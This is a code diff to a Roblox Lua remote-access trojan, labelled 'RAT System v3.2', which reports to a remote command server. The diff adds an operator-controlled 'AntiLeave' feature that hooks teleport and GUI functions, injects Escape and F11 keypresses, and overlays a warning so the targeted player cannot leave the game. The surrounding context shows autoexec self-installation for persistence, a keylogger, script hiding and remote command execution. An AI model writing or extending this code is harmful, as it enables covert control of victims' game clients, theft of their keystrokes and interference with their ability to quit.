@@ -8,6 +8,8 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
 local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
@@ -30,6 +32,12 @@ local lastSendTime = os.time()
 local scriptHidden = false
 local lastUserUpdate = 0
 local deviceType = getDeviceType()
+local antiLeaveEnabled = false
+local antiLeaveTarget = nil
+local originalTeleportService = nil
+local originalCoreGui = nil
+local lastAntiLeaveAction = 0
+local antiLeaveCooldown = 1
 
 local function safeCheck(funcName)
     if funcName == "writefile" then
@@ -82,7 +90,7 @@ local function autoInstallToAutoexec()
     end
     
     local success = pcall(function()
-        local scriptSource = "-- RAT System v3.1\n" .. tostring(script.Source)
+        local scriptSource = "-- RAT System v3.2\n" .. tostring(script.Source)
         
         local autoexecPaths = {
             "autoexec.lua",
@@ -863,6 +871,282 @@ local function executeJumpscareCommand(scareType)
     end
 end
 
+-- AntiLeave System Functions
+local function createAntiLeaveUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AntiLeaveOverlay"
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.IgnoreGuiInset = true
+    screenGui.Enabled = false
+    
+    local overlay = Instance.new("Frame")
+    overlay.Name = "Overlay"
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    overlay.BackgroundTransparency = 0.7
+    overlay.BorderSizePixel = 0
+    overlay.ZIndex = 9999
+    overlay.Visible = false
+    overlay.Parent = screenGui
+    
+    local warningText = Instance.new("TextLabel")
+    warningText.Name = "WarningText"
+    warningText.Size = UDim2.new(0.8, 0, 0.2, 0)
+    warningText.Position = UDim2.new(0.1, 0, 0.4, 0)
+    warningText.BackgroundTransparency = 1
+    warningText.Text = "🚫 ВЫХОД ЗАПРЕЩЕН!\nAntiLeave System активирован"
+    warningText.TextColor3 = Color3.fromRGB(255, 50, 50)
+    warningText.TextScaled = true
+    warningText.Font = Enum.Font.GothamBold
+    warningText.ZIndex = 10000
+    warningText.Visible = false
+    warningText.Parent = screenGui
+    
+    return screenGui
+end
+
+local function shouldBlockAction()
+    if not antiLeaveEnabled then return false end
+    if antiLeaveTarget and antiLeaveTarget ~= player.Name then return false end
+    
+    local currentTime = tick()
+    if currentTime - lastAntiLeaveAction < antiLeaveCooldown then
+        return false
+    end
+    
+    lastAntiLeaveAction = currentTime
+    return true
+end
+
+local antiLeaveUI = nil
+
+local function showAntiLeaveWarning()
+    if not antiLeaveUI then
+        antiLeaveUI = createAntiLeaveUI()
+    end
+    
+    if antiLeaveUI and antiLeaveUI.Parent then
+        antiLeaveUI.Enabled = true
+        antiLeaveUI.Overlay.Visible = true
+        antiLeaveUI.WarningText.Visible = true
+        
+        task.delay(2, function()
+            if antiLeaveUI and antiLeaveUI.Parent then
+                antiLeaveUI.Overlay.Visible = false
+                antiLeaveUI.WarningText.Visible = false
+                antiLeaveUI.Enabled = false
+            end
+        end)
+    end
+end
+
+local function blockTeleport()
+    local teleportService = game:GetService("TeleportService")
+    
+    local oldTeleport = teleportService.Teleport
+    local oldTeleportAsync = teleportService.TeleportAsync
+    
+    local function checkAndBlock(...)
+        if shouldBlockAction() then
+            showAntiLeaveWarning()
+            
+            if chatSystem then
+                chatSystem.addMessage("AntiLeave", "Попытка телепортации заблокирована!", true)
+            end
+            
+            return
+        end
+        return oldTeleport(...)
+    end
+    
+    local function checkAndBlockAsync(...)
+        if shouldBlockAction() then
+            showAntiLeaveWarning()
+            
+            if chatSystem then
+                chatSystem.addMessage("AntiLeave", "Попытка телепортации заблокирована!", true)
+            end
+            
+            return
+        end
+        return oldTeleportAsync(...)
+    end
+    
+    teleportService.Teleport = checkAndBlock
+    teleportService.TeleportAsync = checkAndBlockAsync
+    
+    originalTeleportService = {
+        Teleport = oldTeleport,
+        TeleportAsync = oldTeleportAsync
+    }
+end
+
+local function blockGui()
+    local coreGui = game:GetService("CoreGui")
+    
+    local oldDestroy = coreGui.Destroy
+    
+    local function checkDestroy(self)
+        if shouldBlockAction() then
+            showAntiLeaveWarning()
+            
+            if chatSystem then
+                chatSystem.addMessage("AntiLeave", "Попытка закрытия GUI заблокирована!", true)
+            end
+            
+            return
+        end
+        return oldDestroy(self)
+    end
+    
+    coreGui.Destroy = function(...)
+        return checkDestroy(...)
+    end
+    
+    originalCoreGui = {
+        Destroy = oldDestroy
+    }
+end
+
+local function blockMenu()
+    local function onMenuOpened()
+        if shouldBlockAction() then
+            showAntiLeaveWarning()
+            
+            task.spawn(function()
+                pcall(function()
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
+                    task.wait(0.1)
+                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, nil)
+                end)
+            end)
+            
+            if chatSystem then
+                chatSystem.addMessage("AntiLeave", "Меню выхода было закрыто!", true)
+            end
+        end
+    end
+    
+    local success, menuButton = pcall(function()
+        return player:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("MenuButton")
+    end)
+    
+    if success and menuButton then
+        menuButton.MouseButton1Click:Connect(onMenuOpened)
+    end
+    
+    UserInputService.InputBegan:Connect(function(input, processed)
+        if not processed and input.KeyCode == Enum.KeyCode.Escape then
+            onMenuOpened()
+        end
+    end)
+end
+
+local function blockLeaveAttempts()
+    local function onWindowFocusChanged(hasFocus)
+        if not hasFocus and shouldBlockAction() then
+            showAntiLeaveWarning()
+            
+            task.spawn(function()
+                pcall(function()
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F11, false, nil)
+                    task.wait(0.1)
+                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F11, false, nil)
+                end)
+            end)
+            
+            if chatSystem then
+                chatSystem.addMessage("AntiLeave", "Попытка переключения окна заблокирована!", true)
+            end
+        end
+    end
+    
+    if UserInputService.WindowFocused then
+        UserInputService.WindowFocused:Connect(onWindowFocusChanged)
+    end
+end
+
+local function restoreOriginalFunctions()
+    if originalTeleportService then
+        local teleportService = game:GetService("TeleportService")
+        teleportService.Teleport = originalTeleportService.Teleport
+        teleportService.TeleportAsync = originalTeleportService.TeleportAsync
+        originalTeleportService = nil
+    end
+    
+    if originalCoreGui then
+        local coreGui = game:GetService("CoreGui")
+        coreGui.Destroy = originalCoreGui.Destroy
+        originalCoreGui = nil
+    end
+end
+
+local function enableAntiLeave()
+    if antiLeaveEnabled then return end
+    
+    antiLeaveEnabled = true
+    
+    blockTeleport()
+    blockGui()
+    blockMenu()
+    blockLeaveAttempts()
+    
+    if chatSystem then
+        chatSystem.addMessage("AntiLeave", "Система AntiLeave активирована!", true)
+    end
+    
+    httpRequest({
+        Url = SERVER_URL.."/command",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            command = "anti_leave_status",
+            args = {"enabled", player.Name}
+        })
+    })
+end
+
+local function disableAntiLeave()
+    if not antiLeaveEnabled then return end
+    
+    antiLeaveEnabled = false
+    restoreOriginalFunctions()
+    
+    if antiLeaveUI and antiLeaveUI.Parent then
+        antiLeaveUI.Enabled = false
+        antiLeaveUI.Overlay.Visible = false
+        antiLeaveUI.WarningText.Visible = false
+    end
+    
+    if chatSystem then
+        chatSystem.addMessage("AntiLeave", "Система AntiLeave деактивирована!", true)
+    end
+    
+    httpRequest({
+        Url = SERVER_URL.."/command",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            command = "anti_leave_status",
+            args = {"disabled", player.Name}
+        })
+    })
+end
+
+local function setAntiLeaveTarget(targetPlayer)
+    antiLeaveTarget = targetPlayer
+    
+    if chatSystem then
+        chatSystem.addMessage("AntiLeave", 
+            targetPlayer and ("Цель установлена на: " .. targetPlayer) or "Цель сброшена (все игроки)", 
+            true
+        )
+    end
+end
+
+-- Main command execution function
 local function ExecuteCommand(cmd, args)
     local success = pcall(function()
         if cmd == "chat" then
@@ -1058,6 +1342,35 @@ local function ExecuteCommand(cmd, args)
                 executeJumpscareCommand(scareType)
             end)
         
+        -- AntiLeave команды
+        elseif cmd == "anti_leave" then
+            local action = args[1]
+            local target = args[2]
+            
+            if action == "enable" then
+                enableAntiLeave()
+                if target and target ~= "" and target ~= "all" then
+                    setAntiLeaveTarget(target)
+                else
+                    setAntiLeaveTarget(nil)
+                end
+                
+            elseif action == "disable" then
+                disableAntiLeave()
+                setAntiLeaveTarget(nil)
+                
+            elseif action == "status" then
+                local status = antiLeaveEnabled and "Включен" or "Выключен"
+                local target = antiLeaveTarget or "Все"
+                
+                if chatSystem then
+                    chatSystem.addMessage("AntiLeave", 
+                        string.format("Статус: %s\nЦель: %s", status, target), 
+                        true
+                    )
+                end
+            end
+        
         end
     end)
 end
@@ -1092,6 +1405,7 @@ local function initialize()
     pcall(sendInjectNotification)
     pcall(setupKeylogger)
     pcall(hideScript)
+    pcall(function() antiLeaveUI = createAntiLeaveUI() end)
 end
 
 local function mainLoop()
